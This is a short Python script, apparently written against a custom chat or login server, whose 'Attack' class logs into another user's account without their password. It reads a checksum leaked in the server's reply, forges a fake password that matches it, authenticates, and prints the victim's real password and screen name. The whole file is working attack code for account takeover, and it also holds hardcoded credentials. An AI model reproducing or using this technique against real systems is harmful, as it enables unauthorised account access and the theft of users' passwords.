from tools import * 
import datetime

class Attack(tools):

    enable_push_notifications = True
    user_name = "natali2"
    password = "nsfjsdufoi"


    _msg_login = {"user_name":user_name,"password":password,"enable_push_notifications":enable_push_notifications}


    @classmethod     
    def login_in_someones_account(cls, user_name = "ricki1") -> None:
        # ---------------------------------------------- #
        # This function loging into someones account without the password by createing fake password and than getting the real password
        # :param user_name: the user to get password of
        # :type user_name: str
        # :return: none
        # ---------------------------------------------- #

        sock = super().server_session.connect_to_server()
        with sock:
            cls._msg_login["user_name"] = user_name
            name_checksum = super().server_session.calculate_checksun(user_name)
            login_msg = super().server_session.build_login_msg(cls._msg_login)
            sock.sendall(login_msg.encode())
            server_msg = sock.recv(2048).decode()
            full_checksum = int(server_msg[server_msg.find("checksum: ") + 10: server_msg.find(cls._data_start)])
            password_checksum = full_checksum - name_checksum
            fake_password = ""
            while(password_checksum > 100):
                password_checksum -= 100
                fake_password += chr(100)
            if password_checksum:
                fake_password += chr(password_checksum)
            print(f"[INFO] using fake password: {fake_password}")
            cls._msg_login["password"] = fake_password
            real_password = super().server_session.authenticate_user(user_name, fake_password, sock)
            print("[INFO] Logged successfuly")
            print("[INFO] getting the real password")
            print(f"[RESULT] The real password: {real_password[0]}\nscreenname: {real_password[1]}\nusername: {user_name}")
            
